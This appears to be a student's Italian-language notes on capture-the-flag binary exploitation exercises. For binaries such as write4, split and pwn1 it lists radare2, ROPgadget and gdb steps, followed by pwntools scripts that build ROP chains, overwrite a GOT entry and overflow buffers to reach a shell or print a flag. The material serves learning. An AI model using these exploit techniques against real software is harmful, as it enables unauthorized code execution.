######## esercizio finale: 2_hi ########

-------------------------------------------------------------------------------------------------------------

######## example file: 3_write4 ########

#instructions:

#radare2 ./nome_file
#aaaa
#afl
#pdf @ useful_function //non print_file
#iS 

#cerca "data", controlla che sia r/w e prendi size (esempio: 0x10 per eseguire il prossimo comando) 

#px 10 //segnati l'indirizzo

#ROPgadget --binary ./a.out | grep “istruzione” //es: "mov" in questo caso
#We find           mov ptr [r14], r15,             that puts what’s into r15 at the address pointed by r14 (0x00400628) 

#ROPgadget --binary ./a.out | grep “pop” 
#Let’s find them with ROPgadget:                                          0x0000000000400690 : pop r14 ; pop r15 ; ret

#ROPgadget --binary ./a.out | grep “rdi” 
#Last, we need the gadget to put the address of the string into rdi:      0x0000000000400693 : pop rdi ; ret


#We have everything to build our chain:

from pwn import *

data_seg = 0x00601028  #indirizzo px 10

print_file = 0x400510   #quello di print_file con l'istruzione asl

# RIP offset is at 40
rop = b"A" * 40    # questo non si capisce dove venga fuori

# First gadget to initialize r14 and r15
pop_r14_r15 = 0x0000000000400690 # pop r14 ; pop r15 ; ret
rop += p64(pop_r14_r15)
rop += p64(data_seg)
rop += b"flag.txt"
#write to memory
mov_r15_to_r14 = 0x0000000000400628 # mov qword ptr [r14], r15 ; ret
rop += p64(mov_r15_to_r14)
# Call print_file
pop_rdi = 0x0000000000400693 # pop rdi ; ret
rop += p64(pop_rdi)
rop += p64(data_seg)
rop += p64(print_file)
# Start process and send rop chain
e = process('write4')
e.sendline(rop)
e.interactive()

-------------------------------------------------------------------------------------------------------------

######## example file: 1_GOT ########

#instructions:

#radare2 ./nome_file
#aaaa
#afl
#pdf @ sym.imp.puts //cerca sempre puts 

#segnati l'indirizzo sia di sym.imp.puts che di sym.win

#We have everything to build our chain:

from pwn import *

putsGOT = '0804a00c'
winAddr = '0804854b'

io = process('./auth’)

io.sendlineafter('?\n', putsGOT)
io.sendlineafter('\n', winAddr)

io.interactive()

-------------------------------------------------------------------------------------------------------------
             
######## example file: 1_enc_pwn1 ########

#instructions:

#quando hai un file.c lo guardi senza modificarlo  // in questo caso vediamo che c'è shell()

#radare2 ./nome_file
#aaaa
#afl   //segnati indirizzo di shell
#pdf @ sym.shell //ovviamente l'abbiamo visto dal codice su c    

#gdb

#pattern_create 300 pat300 //pat300 è il nome file
#run < pat300  //se va bene da errore   

#ricordati il tipo di invalid che ti sta dando    // invalid $PC adress

#pattern_search
#guarda nome errore e segnati offset  // es: EIP (è collegato a PC a quanto pare) e ha offset 140

#We have everything to build our chain:

from pwn import *

p = process('./pwn1')
garbage = 'a' * 140 #offset
target_address = 0x080484ad #quello di shell
address = p32(target_address)
msgin = garbage.encode('ascii') + address
p.sendline(msgin)
p.interactive()

-------------------------------------------------------------------------------------------------------------

######## example file: 1_split ########

#instructions:

#gdb

#per prendere offset
#---------------------------------------  
#pattern_create 300 pat300 //pat300 è il nome file
#run < pat300  //se va bene da errore   

#ricordati il tipo di invalid che ti sta dando    // invalid $PC adress

#pattern_search
#guarda nome errore e segnati offset  // es: EIP (è collegato a PC a quanto pare) e ha offset 140     
#-----------------------------------------

#radare2 ./nome_file
#aaaa
#afl
#pdf @ useful_function
#notiamo /bin/ls 

# sappiamo che our ROP chain should have this structure: offset_padding + pop_rdi_gadget + print_flag_cmd + system_addr

#ROPgadget --binary ./a.out | grep “rdi” 
#Last, we need the gadget to put the address of the string into rdi:      0x0000000000400693 : pop rdi ; ret

#radare2 ./nome_file
#iz

#ci segnamo l'indirizzo di /bin/cat/flag.txt

#gdb
#file nome_file
#p system // segnati indirizzo

#We have everything to build our chain:

from pwn import *

io = process('./split')


# Gadget to pop rdi
gadget = p64(0x4007c3)  #comando con grep 

# Print flag
print_flag = p64(0x601060) #comando iz 

#system address
system = p64(0x400560) #comando p system

# Send the payload
payload = b"A"*40 #fill the buffer until ret address  #40 è l'offset
payload += gadget
payload += print_flag
payload += system
io.sendline(payload)
io.interactive()

-------------------------------------------------------------------------------------------------------------

######## example file: 3_java ########

#gdb 

#file nome_file #letteralmente file
#ti chiede debugger y/n e gli metti Y
#disas bash

#cerco jne (istruzione IF)
#e vogliamo andare all'istruzione successiva: mov con locazione di memoria: “0x00000000004007a2”. 

#-- da qua non abbiamo più continuato--

-------------------------------------------------------------------------------------------------------------

######## example file: funmail2.0 ######## --- ######## example file: SpritzPass ########

#gdb

#file nome_file #letteralmente file
#ti chiede debugger y/n e gli metti Y
#break main
#run

#jump nome_funzione // nel nostro caso sia showEmails che printFlag andavano bene

-------------------------------------------------------------------------------------------------------------
